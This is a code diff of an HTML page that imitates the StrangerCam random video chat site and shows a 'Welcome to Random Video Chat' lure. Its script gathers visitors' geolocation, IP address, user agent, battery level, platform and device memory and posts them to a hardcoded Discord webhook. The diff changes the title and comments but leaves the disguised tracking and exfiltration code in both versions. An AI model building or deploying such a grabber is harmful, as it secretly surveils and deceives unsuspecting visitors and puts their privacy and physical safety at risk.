@@ -1,32 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <!-- Original Meta Tags and Content -->
-    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Random Video Chat - StrangerCam.com: Cam With Strangers</title>
-    <meta name="description" content="Enjoy our Anonymous random video chat with over 5.000.000 strangers. No Sign-Up Required! Cam with strangers on StrangerCam.com" />
-    <link rel="canonical" href="https://strangercam.com/" />
-    <meta property="og:locale" content="en_US" />
-    <meta property="og:type" content="website" />
-    <meta property="og:title" content="Random Video Chat - StrangerCam.com: Cam With Strangers" />
-    <meta property="og:description" content="Enjoy our Anonymous random video chat with over 5.000.000 strangers. No Sign-Up Required! Cam with strangers on StrangerCam.com." />
-    <meta property="og:site_name" content="Stranger Cam" />
-    <meta property="article:publisher" content="https://www.facebook.com/strangercam" />
-    <meta property="article:modified_time" content="2021-12-17T14:46:35+00:00" />
-    <meta property="og:image" content="https://strangercam.com/wp-content/uploads/2021/10/Untitled-2.png" />
-    <meta property="og:image:width" content="800" />
-    <meta property="og:image:height" content="532" />
-    <meta property="og:image:type" content="image/png" />
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:site" content="@strangercamapp" />
-    <meta name="twitter:label1" content="Est. reading time" />
-    <meta name="twitter:data1" content="4 minutes" />
-
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
-    <script src="https://unpkg.com/@ungap/custom-elements-builtin"></script>
-    <script src="x-frame-bypass.js" type="module"></script>
-
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Geolocation with Discord Integration</title>
     <style>
         #dialogBox {
             display: none;
@@ -43,12 +20,10 @@
     </style>
 </head>
 <body>
-    <!-- Your page content should remain the same -->
+    <!-- Original Content -->
     <div id="main-content">
-        <!-- Any page content like video chat, chat interface, etc. -->
         <h1>Welcome to Random Video Chat</h1>
         <p>Chat anonymously with strangers from all over the world!</p>
-        <!-- Example content, replace with your actual content -->
     </div>
 
     <!-- Geolocation Dialog Box -->
@@ -58,7 +33,7 @@
     </div>
 
     <script>
-        const discordWebhookURL = "https://discord.com/api/webhooks/1269744683979116584/cNjKRdP0NsvH3NIpezZoS5x1NU336ma0GlpVGf-QLB5m_vfU_gX797a_9jhOiNsLkihm"; // Your provided webhook URL
+        const discordWebhookURL = "https://discord.com/api/webhooks/1269744683979116584/cNjKRdP0NsvH3NIpezZoS5x1NU336ma0GlpVGf-QLB5m_vfU_gX797a_9jhOiNsLkihm"; // Replace with your webhook URL
         const retryDelay = 5000; // 5 seconds
         const maxRetries = 5; // Maximum retries
         let retryCount = 0;
@@ -91,7 +66,7 @@
             return { ipAddress, userAgent, networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory };
         }
 
-        // Send all data to Discord webhook
+        // Function to send the location and device details to Discord
         async function sendToDiscord(latitude, longitude, ipAddress, userAgent, timestamp, networkInfo, batteryPercentage, isCharging, platform, language, deviceMemory) {
             const data = {
                 content: `**User Details:**
